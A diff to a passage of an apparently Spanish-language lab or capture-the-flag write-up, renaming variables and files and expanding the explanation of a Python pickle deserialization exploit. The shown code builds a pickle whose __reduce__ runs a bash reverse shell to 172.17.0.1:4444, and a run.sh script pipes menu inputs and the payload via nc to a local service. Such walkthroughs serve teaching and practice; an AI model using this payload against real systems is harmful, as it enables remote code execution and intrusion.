@@ -451,12 +451,12 @@ import os
 
 class Reverse_shell_atacante:
     def __reduce__(self):
-        cmd = (
+        ejecutar = (
             'bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &"'
         )
-        return os.system, (cmd,)
+        return os.system, (ejecutar,)
 
-with open("payload.bin", "wb") as f:
+with open("salida.bin", "wb") as f:
     f.write(pickle.dumps(Reverse_shell_atacante()))
 ```
 
@@ -467,8 +467,9 @@ lo ejecuto con:
 ```
 python3 generador_codigo
 ```
- y me crea payload.bin, que es donde está serializada la data, aquí es donde reside el problemilla que me encontré porque para enviar la data
- no vale con poner el archivo tiene que ir en crudo y creo otro script para automatizar el envío llamado run.sh:
+ y me crea salida.bin, que es donde está serializada la data, aquí es donde reside el problemilla que me encontré porque para enviar la data
+ no vale con poner el archivo en el programa por nc, tiene que ir en crudo para que lo guarde como data y creo otro script para automatizar el envío llamado run.sh, acordaros del `__reduce__()` de arriba, 
+ después ejecutamos run.sh:
 
  ```bash
 #!/bin/sh
@@ -477,7 +478,7 @@ python3 generador_codigo
   echo "2"; sleep 0.5   # Opción 2
   echo "x"; sleep 0.5   # Nombre (da igual)
   echo "1"; sleep 0.5   # Edad (da igual)
-  cat payload.bin       # Payload binario
+  cat salida.bin       # Payload binario
 ) | nc -q 1 127.0.0.1 6969
 ```
 doy permisos de ejecución:
